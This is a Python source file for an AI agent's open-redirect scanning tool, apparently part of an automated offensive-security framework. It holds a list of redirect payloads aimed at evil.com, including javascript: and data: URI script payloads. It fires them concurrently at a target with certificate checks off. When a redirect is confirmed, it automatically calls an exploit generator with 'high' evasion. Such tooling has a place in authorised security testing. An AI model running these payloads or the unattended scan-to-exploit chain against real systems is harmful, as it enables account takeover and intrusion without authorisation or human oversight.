import urllib.parse
from src.sdk.tool import function_tool
from .common import _DEFAULT_HEADERS, register_appsec_vulnerability

# ─── OPEN REDIRECT ───────────────────────────────────────────────────────────────

@function_tool()
async def open_redirect_scan(
    url: str,
    parameter: str = "redirect",
    extra_params: str = "",
) -> str:
    """
    Test for Open Redirect vulnerabilities (Async Engine).

    Tests the target parameter with payloads that attempt to redirect to an
    external attacker-controlled domain. Detects both direct and URL-encoded
    redirects, header-based redirects, and JavaScript-based meta refreshes.

    Args:
        url: Target URL (e.g. https://target.com/login)
        parameter: Query/body parameter likely used for redirection
                   (default: redirect — also tests: next, url, goto, return, dest)
        extra_params: Additional parameters to include in requests (JSON string)

    Returns:
        Open redirect scan results with confirmed vectors
    """
    import json as _json
    import requests
    import concurrent.futures
    
    out = [f"## Open Redirect Scan (Async Engine): {url}", f"Parameter: {parameter}", ""]

    redirect_params = list(dict.fromkeys(
        [parameter, "redirect", "redirect_uri", "redirect_url", "next", "url",
         "goto", "return", "return_url", "dest", "destination", "target", "link",
         "forward", "location", "continue", "returnTo", "callback"]
    ))

    evil_payloads = [
        "//evil.com",
        "https://evil.com",
        "//evil.com/%2F..",
        "/\\evil.com",
        "///evil.com",
        "////evil.com",
        "https:evil.com",
        "//%09/evil.com",
        "/%2f%2fevil.com",
        "/.evil.com",
        "@evil.com",
        "javascript:alert(document.domain)",
        "data:text/html,<script>window.location='https://evil.com'</script>",
        "//evil.com#",
        "//evil%2ecom",
        "\x09//evil.com",
        "/\tevil.com",
    ]

    extra = {}
    if extra_params:
        try:
            extra = _json.loads(extra_params)
        except Exception:
            pass

    async_requests = []
    
    for param in redirect_params[:8]:
        for payload in evil_payloads:
            test_url = f"{url}?{param}={urllib.parse.quote(payload, safe='/:@')}"
            for extra_k, extra_v in extra.items():
                test_url += f"&{extra_k}={extra_v}"
            
            async_requests.append({
                "url": test_url,
                "headers": _DEFAULT_HEADERS,
                "_param": param,
                "_payload": payload,
            })
            
    out.append(f"🚀 Launching async swarm for {len(async_requests)} Open Redirect payloads...")
    
    # We use ThreadPoolExecutor here because we specifically need `allow_redirects=False` 
    # to catch Location headers before following them.
    open_redirects = []
    confirmed = []
    
    def fetch_or(req_meta):
        try:
            r = requests.get(req_meta["url"], headers=req_meta["headers"], allow_redirects=False, timeout=10, verify=False)
            return req_meta, r, None
        except Exception as e:
            return req_meta, None, e

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(fetch_or, req) for req in async_requests]
        for future in concurrent.futures.as_completed(futures):
            req_meta, r, err = future.result()
            if err or not r: continue
            
            param = req_meta["_param"]
            payload = req_meta["_payload"]
            test_url = req_meta["url"]
            redirect_loc = r.headers.get("Location", "")
            
            if r.status_code in (301, 302, 303, 307, 308) and redirect_loc:
                _loc_parsed = urllib.parse.urlparse(redirect_loc)
                _loc_host = _loc_parsed.netloc.lower().lstrip("/").split(":")[0]
                _is_redirect_to_evil = (
                    _loc_host in ("evil.com", "www.evil.com")
                    or redirect_loc.lower().startswith("//evil.com")
                    or redirect_loc.lower().startswith("/\\evil.com")
                    or redirect_loc.lower().startswith("javascript:")
                    or redirect_loc.lower().startswith("data:")
                )
                if _is_redirect_to_evil:
                    finding = {
                        "type": "OPEN REDIRECT",
                        "param": param,
                        "payload": payload,
                        "location": redirect_loc,
                        "url": test_url
                    }
                    confirmed.append(finding)
                elif redirect_loc not in ("", url):
                    open_redirects.append(f"  [{param}] HTTP {r.status_code} → Location: {redirect_loc[:80]}")
                    
            elif r.status_code == 200 and "evil.com" in (r.text or ""):
                finding = {
                    "type": "JS/META OPEN REDIRECT",
                    "param": param,
                    "payload": payload,
                    "location": "JS/Meta body payload",
                    "url": test_url
                }
                confirmed.append(finding)

    out.append("")
    out.append("── Confirmed Redirects ────────────────────────")
    if confirmed:
        for c in confirmed:
            out.append(f"🔴 {c['type']}")
            out.append(f"  Parameter : {c['param']}")
            out.append(f"  Payload   : {c['payload']}")
            out.append(f"  Location  : {c['location']}")
            out.append(f"  Attack URL: {c['url']}")
            
            await register_appsec_vulnerability(
                target_url=url, vuln_type="Open Redirect", severity="HIGH",
                parameter=c['param'], payload=c['payload'], evidence=f"Redirects to {c['location']}"
            )
                
        out.append(f"\nTotal confirmed open redirects: {len(confirmed)}")
        out.append("Impact: OAuth account takeover via redirect_uri manipulation")
        
        # ── Auto-Exploit Chaining ─────────────────────────────────────
        out.append("\n## Autonomous Exploit Generation")
        try:
            from src.tools.exploit_craft import generate_exploit_code
            
            context_str = f"Target URL: {url}\n\nConfirmed Vulnerabilities:\n"
            for v in confirmed[:2]:
                context_str += f"- {v['type']} via {v['param']}\nPayload: {v['payload']}\n"
            
            exploit_result = await generate_exploit_code.invoke(
                vuln_type="Open Redirect",
                target_tech="Unknown Web Application",
                context=context_str,
                evasion_level="high",
                language="python"
            )
            
            out.append("✅ Auto-Exploit successfully generated and saved:")
            out.append("\n".join(exploit_result.split("\n")[:10]) + "\n...")
        except ImportError:
            out.append("⚠️ Exploit engine (exploit_craft) not available in this build.")
        except Exception as e:
            out.append(f"⚠️ Exploit generation failed: {str(e)[:100]}")
    else:
        out.append("✅ No open redirects confirmed")

    if open_redirects:
        out.append("\n── Suspicious Redirects (investigate manually) ─")
        out.extend(open_redirects[:15])

    return "\n".join(out)
